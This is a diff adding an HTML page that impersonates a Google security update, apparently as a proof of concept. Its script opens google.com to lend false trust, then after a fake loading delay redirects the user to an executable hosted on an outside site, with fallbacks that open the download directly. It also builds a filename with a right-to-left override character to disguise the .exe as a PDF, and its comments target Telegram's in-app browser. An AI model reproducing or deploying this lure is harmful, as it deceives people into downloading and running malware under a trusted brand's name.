@@ -1,0 +1,82 @@
+<html>
+<head>
+    <title>Google Security Update</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f8f9fa;
+        }
+        .google-button {
+            background-color: #4285f4;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        .warning {
+            color: #ea4335;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h2>🔒 Google Security Patch</h2>
+    <p>Critical security update required for your device</p>
+    
+    <button class="google-button" onclick="startAdvancedSpoof()">
+        Install Security Update
+    </button>
+    
+    <p class="warning">⚠️ Do not close this window during installation</p>
+
+    <script>
+        function startAdvancedSpoof() {
+            // 1. Buka tab baru ke Google (untuk spoofing origin)
+            const newWindow = window.open('https://google.com', 'trustedFrame', 'width=800,height=600');
+            
+            // Tampilkan loading indicator
+            if (newWindow) {
+                alert("Opening Google security portal...");
+            }
+
+            setTimeout(() => {
+                // 2. URL file APK yang sesungguhnya (ganti dengan URL APK Anda)
+                const apkUrl = 'https://ryynx88.github.io/poc.exe';
+                
+                // 3. Buat nama file dengan RLO character untuk spoofing extension
+                // Format: "Google_Security_Update.pdf.exe" akan terlihat seperti "Google_Security_Updateexe.pdf"
+                const spoofedFilename = "Google_Security_Update\u202Efdp.exe";
+                
+                // 4. Method 1: Redirect langsung ke file APK
+                // WebView Telegram biasanya akan otomatis download file APK
+                try {
+                    newWindow.location.href = apkUrl;
+                    
+                    // Method 2: Fallback - buka URL download di tab yang sama
+                    setTimeout(() => {
+                        if (newWindow.closed || !newWindow.location.href.includes('google.com')) {
+                            // Jika window tertutup atau sudah redirect, buka langsung
+                            window.open(apkUrl, '_self');
+                        }
+                    }, 2000);
+                    
+                } catch (e) {
+                    // Jika ada error karena cross-origin, buka langsung
+                    console.error("Cross-origin error:", e);
+                    window.open(apkUrl, '_blank');
+                }
+
+            }, 3000); // Delay untuk membuat kesan "loading Google"
+        }
+        
+        // Auto-trigger setelah 2 detik (opsional untuk demo)
+        // setTimeout(startAdvancedSpoof, 2000);
+    </script>
+</body>
+</html>
